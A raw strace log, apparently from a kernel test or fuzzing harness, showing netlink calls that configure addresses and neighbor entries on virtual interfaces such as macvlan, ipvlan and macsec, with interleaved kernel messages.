[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x39\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x33\x00\x00&quot;], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;macvlan1&quot;, ifr_ifindex=58}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x18\x00\x00\x3a\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x34\x08\x00\x01\x00\xac\x14\x14\x34&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;macvlan1&quot;, ifr_ifindex=58}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x0a\x78\x00\x00\x3a\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x34\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x34&quot;], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;macvlan1&quot;, ifr_ifindex=58}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x3a\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x34\x00\x00&quot;], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;ipvlan0&quot;, ifr_ifindex=59}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x18\x00\x00\x3b\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x35\x08\x00\x01\x00\xac\x14\x14\x35&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;ipvlan0&quot;, ifr_ifindex=59}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x0a\x78\x00\x00\x3b\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x35\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x35&quot;], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;ipvlan0&quot;, ifr_ifindex=59}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x3b\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x35\x00\x00&quot;], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=64, nlmsg_type=NLMSG_ERROR, nlmsg_flags=0, nlmsg_seq=0, nlmsg_pid=1}, {error=-EOPNOTSUPP, msg=[{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x3b\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x35\x00\x00&quot;]}], 4096, 0, NULL, NULL) = 64
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;ipvlan1&quot;, ifr_ifindex=60}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x18\x00\x00\x3c\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x36\x08\x00\x01\x00\xac\x14\x14\x36&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;ipvlan1&quot;, ifr_ifindex=60}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x0a\x78\x00\x00\x3c\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x36\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x36&quot;], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;ipvlan1&quot;, ifr_ifindex=60}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x3c\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x36\x00\x00&quot;], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=64, nlmsg_type=NLMSG_ERROR, nlmsg_flags=0, nlmsg_seq=0, nlmsg_pid=1}, {error=-EOPNOTSUPP, msg=[{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x3c\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x36\x00\x00&quot;]}], 4096, 0, NULL, NULL) = 64
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth0_macvtap&quot;, ifr_ifindex=62}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x18\x00\x00\x3e\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x37\x08\x00\x01\x00\xac\x14\x14\x37&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[   77.629123][ T5086] veth1_vlan: entered promiscuous mode
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth0_macvtap&quot;, ifr_ifindex=62}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x0a\x78\x00\x00\x3e\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x37\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x37&quot;], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth0_macvtap&quot;, ifr_ifindex=62}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x3e\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x37\x00\x00&quot;], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth1_macvtap&quot;, ifr_ifindex=61}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x18\x00\x00\x3d\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x38\x08\x00\x01\x00\xac\x14\x14\x38&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth1_macvtap&quot;, ifr_ifindex=61}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x0a\x78\x00\x00\x3d\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x38\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x38&quot;], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth1_macvtap&quot;, ifr_ifindex=61}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x3d\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x38\x00\x00&quot;], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;macvtap0&quot;, ifr_ifindex=63}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x18\x00\x00\x3f\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x39\x08\x00\x01\x00\xac\x14\x14\x39&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;macvtap0&quot;, ifr_ifindex=63}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x0a\x78\x00\x00\x3f\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x39\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x39&quot;], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;macvtap0&quot;, ifr_ifindex=63}) = 0
[pid  5086] close(4)                    = 0
[   77.717841][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): macvlan0: link becomes ready
[   77.725986][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): macvlan1: link becomes ready
[   77.735899][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): veth1_macvtap: link becomes ready
[   77.745600][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): veth0_macvtap: link becomes ready
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x3f\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x39\x00\x00&quot;], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;macsec0&quot;, ifr_ifindex=64}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x18\x00\x00\x40\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x3a\x08\x00\x01\x00\xac\x14\x14\x3a&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;macsec0&quot;, ifr_ifindex=64}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x0a\x78\x00\x00\x40\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x3a\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x3a&quot;], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;macsec0&quot;, ifr_ifindex=64}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x40\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x3a\x00\x00&quot;], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth0_to_batadv&quot;, ifr_ifindex=40}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x18\x00\x00\x28\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x3b\x08\x00\x01\x00\xac\x14\x14\x3b&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth0_to_batadv&quot;, ifr_ifindex=40}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x0a\x78\x00\x00\x28\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x3b\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x3b&quot;], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth0_to_batadv&quot;, ifr_ifindex=40}) = 0
[pid  5086] close(4)                    = 0
